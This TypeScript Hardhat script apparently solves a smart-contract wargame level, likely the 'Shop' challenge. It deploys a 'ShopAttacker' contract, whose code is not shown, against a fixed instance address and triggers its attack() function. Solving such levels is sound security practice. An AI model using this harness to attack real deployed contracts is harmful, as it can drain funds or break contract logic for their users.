import { ethers } from "hardhat";
import * as fs from 'fs';
import { ShopAttacker__factory } from '../typechain-types';
import { privateKey, rpc } from "../hardhat.config";

const instanceAddress = '0x67988694692602C193b6Ae8368C506D8ad8AFFD3'

const main = async () =>  {
    let tx;
  
    const provider = new ethers.JsonRpcProvider(rpc);
    const signer = new ethers.Wallet(privateKey, provider);

    console.log("Hacking the contract...");

    const metadata = JSON.parse(fs.readFileSync('./artifacts/contracts/attackers/ShopAttacker.sol/ShopAttacker.json').toString());
    const factory = new ethers.ContractFactory(metadata.abi, metadata.bytecode, signer);
    const contract = await factory.deploy(instanceAddress);
    await contract.deploymentTransaction()?.wait();

    const attackerAddress = await contract.getAddress();
    const attacker = ShopAttacker__factory.connect(attackerAddress, signer)

    tx = await attacker.connect(signer).attack();
    await tx.wait();

    console.log("Successfully hacked!");
}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});